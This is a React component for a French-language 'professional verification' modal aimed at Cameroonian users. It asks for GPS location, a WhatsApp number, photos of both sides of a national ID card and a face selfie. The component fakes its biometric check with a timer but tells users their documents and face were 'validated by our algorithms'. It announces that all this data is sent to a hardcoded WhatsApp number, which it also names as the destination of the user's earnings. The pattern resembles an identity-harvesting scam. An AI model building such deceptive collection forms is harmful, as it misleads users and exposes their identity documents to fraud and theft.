import React, { useState, useRef, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { 
  DollarSign, MapPin, Globe, Phone, FileText, CheckCircle2, 
  X, ArrowRight, Camera, ShieldCheck, Send, AlertCircle,
  Smartphone, Languages, Landmark, Search, User, Video,
  Upload, Eye
} from 'lucide-react';

interface MonetizationModalProps {
  isOpen: boolean;
  onClose: () => void;
}

const MonetizationModal: React.FC<MonetizationModalProps> = ({ isOpen, onClose }) => {
  const [step, setStep] = useState(1);
  const [formData, setFormData] = useState({
    location: '',
    lat: 0,
    lng: 0,
    languages: [] as string[],
    whatsapp: '',
    cniFront: null as string | null,
    cniBack: null as string | null,
    faceSelfie: null as string | null,
    country: 'Cameroun'
  });
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const [isCameraActive, setIsCameraActive] = useState(false);
  const [isVerifyingFace, setIsVerifyingFace] = useState(false);
  const [isLocating, setIsLocating] = useState(false);
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const [mapSearch, setMapSearch] = useState('');

  const languages = [
    { id: 'fr', label: 'Français' },
    { id: 'en', label: 'Anglais' },
    { id: 'zh', label: 'Chinois' },
    { id: 'es', label: 'Espagnol' }
  ];

  const handleToggleLanguage = (lang: string) => {
    setFormData(prev => ({
      ...prev,
      languages: prev.languages.includes(lang) 
        ? prev.languages.filter(l => l !== lang)
        : [...prev.languages, lang]
    }));
  };

  const startCamera = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        setIsCameraActive(true);
      }
    } catch (err) {
      alert("Erreur d'accès à la caméra. Veuillez autoriser l'accès.");
    }
  };

  const stopCamera = () => {
    if (videoRef.current && videoRef.current.srcObject) {
      const stream = videoRef.current.srcObject as MediaStream;
      stream.getTracks().forEach(track => track.stop());
      setIsCameraActive(false);
    }
  };

  const capturePhoto = (type: 'cniFront' | 'cniBack' | 'faceSelfie') => {
    if (videoRef.current && canvasRef.current) {
      const context = canvasRef.current.getContext('2d');
      if (context) {
        canvasRef.current.width = videoRef.current.videoWidth;
        canvasRef.current.height = videoRef.current.videoHeight;
        context.drawImage(videoRef.current, 0, 0);
        const dataUrl = canvasRef.current.toDataURL('image/jpeg');
        
        if (type === 'faceSelfie') {
          setIsVerifyingFace(true);
          // Simulate professional verification algorithm
          setTimeout(() => {
            setFormData({ ...formData, [type]: dataUrl });
            setIsVerifyingFace(false);
            stopCamera();
          }, 2000);
        } else {
          setFormData({ ...formData, [type]: dataUrl });
          stopCamera();
        }
      }
    }
  };

  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>, type: 'cniFront' | 'cniBack') => {
    const file = e.target.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onloadend = () => {
        setFormData({ ...formData, [type]: reader.result as string });
      };
      reader.readAsDataURL(file);
    }
  };

  const handleSubmit = () => {
    setIsSubmitting(true);
    setTimeout(() => {
      setIsSubmitting(false);
      setIsSuccess(true);
      console.log("Sending verified data to WhatsApp 694841595:", {
        ...formData,
        targetNumber: "694841595",
        verificationStatus: "ALGO_VERIFIED_PROFESSIONAL"
      });
    }, 3000);
  };

  const handleGetLocation = () => {
    if (!navigator.geolocation) {
      alert("La géolocalisation n'est pas supportée par votre navigateur.");
      return;
    }

    setIsLocating(true);
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const { latitude, longitude } = position.coords;
        setFormData(prev => ({
          ...prev,
          lat: latitude,
          lng: longitude,
          location: `Lat: ${latitude.toFixed(6)}, Lng: ${longitude.toFixed(6)}`
        }));
        setIsLocating(false);
      },
      (error) => {
        setIsLocating(false);
        let errorMsg = "Impossible d'obtenir votre position.";
        if (error.code === error.PERMISSION_DENIED) {
          errorMsg = "Accès à la localisation refusé. Veuillez l'autoriser dans vos paramètres.";
        }
        alert(errorMsg);
      },
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
  };

  useEffect(() => {
    return () => stopCamera();
  }, []);

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-[150] flex items-center justify-center p-4 bg-black/95 backdrop-blur-xl animate-fade-in">
      <motion.div 
        initial={{ scale: 0.9, opacity: 0, y: 20 }}
        animate={{ scale: 1, opacity: 1, y: 0 }}
        className="bg-brand-800 w-full max-w-xl rounded-[2.5rem] border border-brand-600 shadow-2xl overflow-hidden flex flex-col max-h-[90vh]"
      >
        {/* Header */}
        <div className="p-8 border-b border-brand-700 flex justify-between items-center bg-brand-900/50">
          <div className="flex items-center gap-4">
            <div className="bg-emerald-500/20 p-3 rounded-2xl text-emerald-500">
              <DollarSign size={24} />
            </div>
            <div>
              <h3 className="text-xl font-black text-white uppercase italic tracking-tight">Vérification Professionnelle</h3>
              <p className="text-[10px] text-slate-500 font-black uppercase tracking-widest">Étape {step} sur 5</p>
            </div>
          </div>
          <button onClick={onClose} className="text-slate-500 hover:text-white transition-colors p-2 hover:bg-white/5 rounded-full">
            <X size={24} />
          </button>
        </div>

        {/* Content */}
        <div className="flex-1 overflow-y-auto p-8 custom-scrollbar">
          <AnimatePresence mode="wait">
            {isSuccess ? (
              <motion.div 
                initial={{ opacity: 0, scale: 0.9 }}
                animate={{ opacity: 1, scale: 1 }}
                className="text-center py-12 space-y-6"
              >
                <div className="w-24 h-24 bg-emerald-500/20 rounded-full flex items-center justify-center mx-auto border-2 border-emerald-500/50 shadow-[0_0_30px_rgba(16,185,129,0.2)]">
                  <CheckCircle2 size={48} className="text-emerald-500" />
                </div>
                <div className="space-y-2">
                  <h4 className="text-2xl font-black text-white uppercase italic">Vérification Terminée !</h4>
                  <p className="text-slate-400 text-sm font-medium px-8">
                    Vos documents et votre scan facial ont été validés par nos algorithmes. Vos revenus seront envoyés au 694841595.
                  </p>
                </div>
                <button 
                  onClick={onClose}
                  className="bg-emerald-500 text-brand-900 font-black px-10 py-4 rounded-2xl uppercase text-xs tracking-widest shadow-lg hover:bg-emerald-400 transition-all"
                >
                  Accéder à mes gains
                </button>
              </motion.div>
            ) : (
              <div className="space-y-8">
                {step === 1 && (
                  <motion.div 
                    initial={{ opacity: 0, x: 20 }}
                    animate={{ opacity: 1, x: 0 }}
                    exit={{ opacity: 0, x: -20 }}
                    className="space-y-6"
                  >
                    <div className="space-y-4">
                      <div className="flex items-center gap-3 text-emerald-500 mb-2">
                        <MapPin size={20} />
                        <h4 className="text-sm font-black uppercase tracking-widest">Localisation Précise</h4>
                      </div>
                      
                      <div className="space-y-4">
                        <div>
                          <label className="text-[10px] text-slate-500 font-black uppercase tracking-widest mb-2 block">Détection de Position</label>
                          <button 
                            onClick={handleGetLocation}
                            disabled={isLocating}
                            className="w-full bg-brand-900 border border-brand-700 rounded-2xl p-4 flex items-center justify-center gap-3 hover:border-emerald-500 transition-all group active:scale-95 disabled:opacity-50"
                          >
                            {isLocating ? (
                              <>
                                <div className="w-4 h-4 border-2 border-emerald-500 border-t-transparent rounded-full animate-spin"></div>
                                <span className="text-xs text-white font-bold uppercase">Localisation en cours...</span>
                              </>
                            ) : (
                              <>
                                <MapPin className="text-emerald-500 group-hover:scale-110 transition-transform" size={20} />
                                <span className="text-xs text-white font-bold uppercase">Obtenir ma position GPS</span>
                              </>
                            )}
                          </button>
                        </div>

                        <div className="grid grid-cols-2 gap-3">
                          <div className="bg-brand-900 border border-brand-700 rounded-2xl p-4">
                            <label className="text-[9px] text-slate-500 font-black uppercase tracking-widest mb-1 block">Latitude</label>
                            <p className="text-white font-mono text-sm">{formData.lat ? formData.lat.toFixed(6) : '---'}</p>
                          </div>
                          <div className="bg-brand-900 border border-brand-700 rounded-2xl p-4">
                            <label className="text-[9px] text-slate-500 font-black uppercase tracking-widest mb-1 block">Longitude</label>
                            <p className="text-white font-mono text-sm">{formData.lng ? formData.lng.toFixed(6) : '---'}</p>
                          </div>
                        </div>

                        <div className="w-full h-48 bg-brand-900 rounded-3xl border border-brand-700 overflow-hidden relative group">
                          <div className="absolute inset-0 bg-[url('https://maps.googleapis.com/maps/api/staticmap?center=Douala,Cameroon&zoom=13&size=600x300&key=YOUR_API_KEY_HERE')] bg-cover bg-center opacity-50 grayscale group-hover:grayscale-0 transition-all duration-500"></div>
                          <div className="absolute inset-0 flex items-center justify-center">
                            <div className="bg-brand-800/80 backdrop-blur-sm p-4 rounded-2xl border border-brand-600 text-center">
                              <MapPin className="text-emerald-500 mx-auto mb-2" size={24} />
                              <p className="text-[10px] text-white font-black uppercase">{formData.location || 'Position non détectée'}</p>
                            </div>
                          </div>
                        </div>

                        <div>
                          <label className="text-[10px] text-slate-500 font-black uppercase tracking-widest mb-2 block">Langues Comprises</label>
                          <div className="grid grid-cols-2 gap-3">
                            {languages.map(lang => (
                              <button
                                key={lang.id}
                                onClick={() => handleToggleLanguage(lang.label)}
                                className={`p-4 rounded-2xl border flex items-center gap-3 transition-all ${
                                  formData.languages.includes(lang.label)
                                  ? 'bg-emerald-500/10 border-emerald-500 text-white'
                                  : 'bg-brand-900 border-brand-700 text-slate-500'
                                }`}
                              >
                                <div className={`w-4 h-4 rounded-full border-2 flex items-center justify-center ${
                                  formData.languages.includes(lang.label) ? 'border-emerald-500 bg-emerald-500' : 'border-slate-700'
                                }`}>
                                  {formData.languages.includes(lang.label) && <CheckCircle2 size={10} className="text-brand-900" />}
                                </div>
                                <span className="text-xs font-bold">{lang.label}</span>
                              </button>
                            ))}
                          </div>
                        </div>
                      </div>
                    </div>
                  </motion.div>
                )}

                {step === 2 && (
                  <motion.div 
                    initial={{ opacity: 0, x: 20 }}
                    animate={{ opacity: 1, x: 0 }}
                    exit={{ opacity: 0, x: -20 }}
                    className="space-y-6"
                  >
                    <div className="space-y-4">
                      <div className="flex items-center gap-3 text-emerald-500 mb-2">
                        <Smartphone size={20} />
                        <h4 className="text-sm font-black uppercase tracking-widest">Contact WhatsApp</h4>
                      </div>
                      
                      <div className="bg-emerald-500/5 p-4 rounded-2xl border border-emerald-500/10 flex gap-3">
                        <AlertCircle className="text-emerald-500 flex-shrink-0" size={20} />
                        <p className="text-[10px] text-emerald-200/60 font-medium leading-relaxed">
                          Ce numéro sera utilisé pour vous envoyer vos gains et les notifications de monétisation.
                        </p>
                      </div>

                      <div>
                        <label className="text-[10px] text-slate-500 font-black uppercase tracking-widest mb-2 block">Numéro WhatsApp</label>
                        <div className="relative">
                          <input 
                            type="tel"
                            value={formData.whatsapp}
                            onChange={(e) => setFormData({ ...formData, whatsapp: e.target.value })}
                            placeholder="+237 6XX XXX XXX"
                            className="w-full bg-brand-900 border border-brand-700 rounded-2xl p-4 text-white text-sm focus:border-emerald-500 outline-none transition-all"
                          />
                          <Phone className="absolute right-4 top-1/2 -translate-y-1/2 text-slate-700" size={18} />
                        </div>
                      </div>
                    </div>
                  </motion.div>
                )}

                {step === 3 && (
                  <motion.div 
                    initial={{ opacity: 0, x: 20 }}
                    animate={{ opacity: 1, x: 0 }}
                    exit={{ opacity: 0, x: -20 }}
                    className="space-y-6"
                  >
                    <div className="space-y-4">
                      <div className="flex items-center gap-3 text-emerald-500 mb-2">
                        <FileText size={20} />
                        <h4 className="text-sm font-black uppercase tracking-widest">Vérification CNI (Images Réelles)</h4>
                      </div>

                      <div className="grid grid-cols-1 gap-6">
                        <div className="space-y-3">
                          <p className="text-[10px] text-slate-500 font-black uppercase tracking-widest">Recto de la CNI</p>
                          <div className="relative group">
                            {formData.cniFront ? (
                              <div className="relative rounded-3xl overflow-hidden border-2 border-emerald-500 h-48">
                                <img src={formData.cniFront} className="w-full h-full object-cover" alt="CNI Front" />
                                <button 
                                  onClick={() => setFormData({ ...formData, cniFront: null })}
                                  className="absolute top-2 right-2 bg-red-500 p-2 rounded-full text-white shadow-lg"
                                >
                                  <X size={16} />
                                </button>
                              </div>
                            ) : (
                              <div className="border-2 border-dashed border-brand-700 rounded-3xl p-8 flex flex-col items-center justify-center gap-3 hover:border-emerald-500/50 transition-colors bg-brand-900/50">
                                <Upload size={32} className="text-slate-600" />
                                <div className="flex gap-2">
                                  <label className="bg-brand-700 text-white px-4 py-2 rounded-xl text-[10px] font-black uppercase cursor-pointer hover:bg-brand-600 transition-all">
                                    Upload Image
                                    <input type="file" accept="image/*" className="hidden" onChange={(e) => handleFileUpload(e, 'cniFront')} />
                                  </label>
                                  <button onClick={startCamera} className="bg-emerald-500 text-brand-900 px-4 py-2 rounded-xl text-[10px] font-black uppercase hover:bg-emerald-400 transition-all">
                                    Caméra
                                  </button>
                                </div>
                                <p className="text-[9px] text-slate-500 font-bold">Format JPG, PNG supporté</p>
                              </div>
                            )}
                          </div>
                        </div>

                        <div className="space-y-3">
                          <p className="text-[10px] text-slate-500 font-black uppercase tracking-widest">Verso de la CNI</p>
                          <div className="relative group">
                            {formData.cniBack ? (
                              <div className="relative rounded-3xl overflow-hidden border-2 border-emerald-500 h-48">
                                <img src={formData.cniBack} className="w-full h-full object-cover" alt="CNI Back" />
                                <button 
                                  onClick={() => setFormData({ ...formData, cniBack: null })}
                                  className="absolute top-2 right-2 bg-red-500 p-2 rounded-full text-white shadow-lg"
                                >
                                  <X size={16} />
                                </button>
                              </div>
                            ) : (
                              <div className="border-2 border-dashed border-brand-700 rounded-3xl p-8 flex flex-col items-center justify-center gap-3 hover:border-emerald-500/50 transition-colors bg-brand-900/50">
                                <Upload size={32} className="text-slate-600" />
                                <div className="flex gap-2">
                                  <label className="bg-brand-700 text-white px-4 py-2 rounded-xl text-[10px] font-black uppercase cursor-pointer hover:bg-brand-600 transition-all">
                                    Upload Image
                                    <input type="file" accept="image/*" className="hidden" onChange={(e) => handleFileUpload(e, 'cniBack')} />
                                  </label>
                                  <button onClick={startCamera} className="bg-emerald-500 text-brand-900 px-4 py-2 rounded-xl text-[10px] font-black uppercase hover:bg-emerald-400 transition-all">
                                    Caméra
                                  </button>
                                </div>
                                <p className="text-[9px] text-slate-500 font-bold">Format JPG, PNG supporté</p>
                              </div>
                            )}
                          </div>
                        </div>
                      </div>
                    </div>
                  </motion.div>
                )}

                {step === 4 && (
                  <motion.div 
                    initial={{ opacity: 0, x: 20 }}
                    animate={{ opacity: 1, x: 0 }}
                    exit={{ opacity: 0, x: -20 }}
                    className="space-y-6"
                  >
                    <div className="space-y-4">
                      <div className="flex items-center gap-3 text-emerald-500 mb-2">
                        <User size={20} />
                        <h4 className="text-sm font-black uppercase tracking-widest">Vérification Faciale (Liveness)</h4>
                      </div>

                      <div className="bg-brand-900 rounded-3xl border border-brand-700 overflow-hidden relative aspect-square max-w-[300px] mx-auto">
                        {formData.faceSelfie ? (
                          <div className="relative w-full h-full">
                            <img src={formData.faceSelfie} className="w-full h-full object-cover" alt="Face Scan" />
                            <div className="absolute inset-0 bg-emerald-500/20 flex items-center justify-center">
                              <div className="bg-emerald-500 text-brand-900 px-4 py-2 rounded-full text-[10px] font-black uppercase flex items-center gap-2">
                                <CheckCircle2 size={14} /> Algorithme Validé
                              </div>
                            </div>
                            <button 
                              onClick={() => setFormData({ ...formData, faceSelfie: null })}
                              className="absolute top-4 right-4 bg-red-500 p-2 rounded-full text-white shadow-lg"
                            >
                              <X size={16} />
                            </button>
                          </div>
                        ) : (
                          <div className="w-full h-full flex flex-col items-center justify-center p-8 text-center relative">
                            {isCameraActive ? (
                              <>
                                <video ref={videoRef} autoPlay playsInline className="absolute inset-0 w-full h-full object-cover grayscale brightness-75" />
                                
                                {/* Scanning Overlay Effects */}
                                <div className="absolute inset-0 pointer-events-none">
                                  <div className="absolute inset-0 border-[2px] border-emerald-500/30 m-8 rounded-full"></div>
                                  <div className="absolute top-1/2 left-0 w-full h-[2px] bg-emerald-500/50 shadow-[0_0_15px_#10b981] animate-scan-line"></div>
                                  
                                  {/* Biometric Points Simulation */}
                                  <div className="absolute top-1/3 left-1/3 w-1 h-1 bg-emerald-500 rounded-full animate-ping"></div>
                                  <div className="absolute top-1/3 right-1/3 w-1 h-1 bg-emerald-500 rounded-full animate-ping [animation-delay:0.5s]"></div>
                                  <div className="absolute bottom-1/3 left-1/2 w-1 h-1 bg-emerald-500 rounded-full animate-ping [animation-delay:1s]"></div>
                                </div>

                                <div className="relative z-10 space-y-4">
                                  {isVerifyingFace ? (
                                    <div className="bg-brand-900/80 backdrop-blur-md p-6 rounded-3xl border border-emerald-500/50 shadow-2xl">
                                      <div className="w-10 h-10 border-4 border-emerald-500 border-t-transparent rounded-full animate-spin mx-auto mb-3"></div>
                                      <p className="text-[10px] text-white font-black uppercase tracking-widest">Analyse Biométrique...</p>
                                      <p className="text-[8px] text-emerald-500/70 font-bold mt-1">Vérification de liveness en cours</p>
                                    </div>
                                  ) : (
                                    <div className="flex flex-col items-center gap-4">
                                      <div className="bg-emerald-500/10 backdrop-blur-sm px-4 py-2 rounded-full border border-emerald-500/30">
                                        <p className="text-[9px] text-emerald-500 font-black uppercase">Alignez votre visage</p>
                                      </div>
                                      <button 
                                        onClick={() => capturePhoto('faceSelfie')}
                                        className="bg-emerald-500 text-brand-900 w-20 h-20 rounded-full flex items-center justify-center shadow-[0_0_30px_rgba(16,185,129,0.4)] hover:scale-110 transition-all active:scale-95 group"
                                      >
                                        <Camera size={32} className="group-hover:rotate-12 transition-transform" />
                                      </button>
                                    </div>
                                  )}
                                </div>
                              </>
                            ) : (
                              <>
                                <div className="bg-brand-800 p-6 rounded-full mb-4">
                                  <Video size={48} className="text-slate-600" />
                                </div>
                                <p className="text-xs text-slate-400 mb-6 px-4">Placez votre visage dans le cadre pour une vérification professionnelle en temps réel.</p>
                                <button 
                                  onClick={startCamera}
                                  className="bg-emerald-500 text-brand-900 px-8 py-4 rounded-2xl font-black uppercase text-xs shadow-lg hover:bg-emerald-400 transition-all"
                                >
                                  Démarrer le Scan
                                </button>
                              </>
                            )}
                          </div>
                        )}
                      </div>
                      <canvas ref={canvasRef} className="hidden" />
                    </div>
                  </motion.div>
                )}

                {step === 5 && (
                  <motion.div 
                    initial={{ opacity: 0, x: 20 }}
                    animate={{ opacity: 1, x: 0 }}
                    exit={{ opacity: 0, x: -20 }}
                    className="space-y-6"
                  >
                    <div className="space-y-4">
                      <div className="flex items-center gap-3 text-emerald-500 mb-2">
                        <ShieldCheck size={20} />
                        <h4 className="text-sm font-black uppercase tracking-widest">Confirmation Finale</h4>
                      </div>

                      <div className="bg-brand-900 border border-brand-700 rounded-3xl p-6 space-y-4">
                        <div className="flex justify-between items-center border-b border-brand-700 pb-3">
                          <span className="text-[10px] text-slate-500 font-black uppercase">WhatsApp</span>
                          <span className="text-xs text-white font-bold">{formData.whatsapp || 'Non renseigné'}</span>
                        </div>
                        <div className="flex justify-between items-center border-b border-brand-700 pb-3">
                          <span className="text-[10px] text-slate-500 font-black uppercase">Localisation</span>
                          <span className="text-xs text-white font-bold">{formData.location || 'Non renseigné'}</span>
                        </div>
                        <div className="flex justify-between items-center border-b border-brand-700 pb-3">
                          <span className="text-[10px] text-slate-500 font-black uppercase">Vérification CNI</span>
                          <span className="text-xs text-emerald-500 font-bold flex items-center gap-1"><CheckCircle2 size={12} /> Images Prêtes</span>
                        </div>
                        <div className="flex justify-between items-center">
                          <span className="text-[10px] text-slate-500 font-black uppercase">Scan Facial</span>
                          <span className="text-xs text-emerald-500 font-bold flex items-center gap-1"><CheckCircle2 size={12} /> Bio-Validé</span>
                        </div>
                      </div>

                      <div className="bg-blue-500/10 p-4 rounded-2xl border border-blue-500/20 flex gap-3">
                        <Send className="text-blue-500 flex-shrink-0" size={20} />
                        <p className="text-[10px] text-blue-200/60 font-medium leading-relaxed">
                          En cliquant sur "Activer", vos données seront envoyées automatiquement au numéro <span className="text-white font-bold">694841595</span> pour validation finale.
                        </p>
                      </div>
                    </div>
                  </motion.div>
                )}
              </div>
            )}
          </AnimatePresence>
        </div>

        {/* Footer */}
        {!isSuccess && (
          <div className="p-8 border-t border-brand-700 bg-brand-900/50 flex gap-4">
            {step > 1 && (
              <button 
                onClick={() => {
                  stopCamera();
                  setStep(s => s - 1);
                }}
                className="flex-1 bg-brand-800 text-slate-400 font-black py-4 rounded-2xl uppercase text-xs tracking-widest border border-brand-700 hover:text-white transition-all"
              >
                Retour
              </button>
            )}
            <button 
              onClick={() => {
                stopCamera();
                step < 5 ? setStep(s => s + 1) : handleSubmit();
              }}
              disabled={isSubmitting || (step === 4 && !formData.faceSelfie)}
              className="flex-[2] bg-emerald-500 text-brand-900 font-black py-4 rounded-2xl uppercase text-xs tracking-widest shadow-lg shadow-emerald-500/20 hover:bg-emerald-400 transition-all active:scale-95 flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {isSubmitting ? (
                <>
                  <div className="w-4 h-4 border-2 border-brand-900/20 border-t-brand-900 rounded-full animate-spin" />
                  Envoi en cours...
                </>
              ) : (
                <>
                  {step === 5 ? 'Activer la Monétisation' : 'Continuer'}
                  <ArrowRight size={16} />
                </>
              )}
            </button>
          </div>
        )}
      </motion.div>
    </div>
  );
};

export default MonetizationModal;
